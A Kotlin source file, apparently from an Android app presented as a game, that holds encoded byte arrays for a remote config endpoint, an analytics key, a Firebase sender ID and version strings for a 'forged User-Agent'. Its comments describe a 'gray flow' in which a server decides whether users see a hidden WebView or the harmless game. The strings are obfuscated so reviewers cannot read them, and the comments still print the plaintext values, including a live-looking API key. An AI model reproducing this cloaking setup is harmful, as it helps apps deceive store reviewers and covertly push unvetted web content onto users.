package com.olympussurge.game.oracle.crypt

/**
 * Encoded byte arrays that resolve, at runtime, into the endpoint,
 * SDK keys and User-Agent fragments used by the gray flow.
 *
 * Plaintext MUST NEVER appear as a string literal in this file — that
 * would defeat the whole point of [OracleCodec].
 *
 * ────────────────────────────────────────────────────────────────
 * HOW TO POPULATE
 * ────────────────────────────────────────────────────────────────
 * 1. Ask the manager for:
 *      • config endpoint URL   (e.g. https://olymmpussurge.com/config.php)
 *      • AppsFlyer Dev Key
 *      • Firebase project number (from google-services.json)
 *    See `.cursor/rules/oracle_gray_guide.md` §"Config Request Contract".
 *
 * 2. Edit `tools/pack_secrets.py` — paste those raw strings into the
 *    plaintext table at the bottom of the file. Never commit that
 *    plaintext version.
 *
 * 3. IMPORTANT: also update [OracleCodec.SEED_PHRASE] +
 *    [OracleCodec.STREAM_LEN] to values UNIQUE to this fork. Then
 *    mirror those two constants at the top of `pack_secrets.py`.
 *
 * 4. Run `python tools/pack_secrets.py` from the project root. It
 *    prints six updated `val ... = intArrayOf(...)` lines.
 *
 * 5. Paste them here, replacing the six existing arrays.
 *
 * 6. Verify: launch the app once — [OracleLoadingScreen] must reach
 *    the config reply successfully (either allow → WebView, or deny
 *    → native game). If you see the offline screen on a live
 *    network, the byte arrays are misaligned with the seed.
 */
internal object OracleSecrets {

    // Full POST endpoint that decides web (gray) vs native (game).
    // Plaintext: `https://olymmpussurge.com/config.php`.
    val CONFIG_ENDPOINT_BYTES = intArrayOf(
        199, 61, 44, 133, 8, 46, 239, 48, 17, 37, 237, 56,
        223, 54, 162, 144, 47, 27, 103, 34, 214, 59, 134, 202,
        126, 58, 105, 219, 58, 33, 129, 7, 31, 151, 82, 37,
    )

    // AppsFlyer Dev Key. Plaintext: `6MzAAqPD2jE4cXuwRwexqC`.
    val ATTRIBUTION_KEY_BYTES = intArrayOf(
        153, 4, 34, 180, 58, 101, 144, 91, 76, 35, 209, 97,
        209, 30, 162, 148, 14, 25, 112, 61, 194, 86,
    )

    // Firebase project number / sender id. Plaintext: `893534989184`.
    val MESSAGING_PROJECT_BYTES = intArrayOf(
        151, 112, 107, 192, 72, 32, 249, 39, 71, 120, 172, 97,
    )

    // Chrome major/build/patch fragment for the forged User-Agent.
    // Plaintext: `149.0.7823.147`. Bump on every fork.
    val CHROME_VERSION_BYTES = intArrayOf(
        158, 125, 97, 219, 75, 58, 247, 39, 76, 122, 186, 100, 134, 113,
    )

    // WebKit version fragment. Plaintext: `537.36`.
    val WEBKIT_VERSION_BYTES = intArrayOf(
        154, 122, 111, 219, 72, 34,
    )

    fun configEndpoint(): String = OracleCodec.decode(CONFIG_ENDPOINT_BYTES)
    fun attributionKey(): String = OracleCodec.decode(ATTRIBUTION_KEY_BYTES)
    fun messagingProject(): String = OracleCodec.decode(MESSAGING_PROJECT_BYTES)
    fun chromeVersion(): String = OracleCodec.decode(CHROME_VERSION_BYTES)
    fun webkitVersion(): String = OracleCodec.decode(WEBKIT_VERSION_BYTES)
}
